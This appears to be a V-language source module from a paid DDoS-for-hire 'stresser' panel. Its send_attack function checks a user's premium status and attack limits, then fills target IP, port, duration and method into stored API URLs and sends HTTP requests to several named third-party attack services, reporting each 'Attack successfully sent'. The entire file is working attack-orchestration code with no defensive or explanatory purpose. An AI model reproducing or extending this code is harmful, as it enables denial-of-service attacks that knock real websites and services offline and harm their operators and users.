module api_attack

import api_attack
import auth
import net.http
import os
import wocky_utils

pub struct API_Attack_Info {
	pub mut:
		apis_found int
		response string
}

pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time int, method string) string {
	mut api_c := api_attack.API_Crud{}
	mut cf := auth.CrudFunc{user: usr}
	mut attk_c := auth.AttackCrud{user: usr}
	mut attk_f := auth.AttackFunc{user: usr}
	mut wutils := wocky_utils.Custom_utils{}
	if cf.is_premium() == true {
		if attk_f.attack_validation() {
			if attk_f.validate_time() {
				mut apis := api_c.apis_with_method(method) // this function return an array of APIs
				s.apis_found = apis.len
				// println(apis)
				mut resp := ''
				for api in apis { 
					mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
					if api.contains("api.orphicsecurityteam.com") {
						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | OrphicSecurityTeam\r\n"
					} else if api.contains("toxicstress.live") {
						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | ToxicStress\r\n"
					} else if api.contains("downed.rip") {
						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | DownedAPI\r\n"
					} else if api.contains("astrasecurityteam") {
						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | AstraSecurityTeam\r\n"
					} else {
						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | Error Pulling API Name\r\n"
					}
					// println(f) // print response to make sure attack is going thru
				}
				s.response = resp
				// if wutils.str_contain_count(s.response, "\n") == s.apis_found {
				// 	// send with 's.apis_found' apis
				// }
				// attk_c.user_conn_up() // up the user on-going attk
				return resp
			} else {
				return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
			}
		} else {
			return "You've reached the maximum concurrents. Please wait until an attack to finish!\r\n"
		}
	} else {
		return "You are not a premium user to use this command!\r\n"
	}
}

pub fn (mut s API_Attack_Info) fix_api(api string, ip string, port int, time int, method string) string {
	mut g := api.replace("[host]", ip)
	g = g.replace("[port]", port.str())
	g = g.replace("[time]", time.str())
	g = g.replace("[method]", method)
	println(g)
	return g
}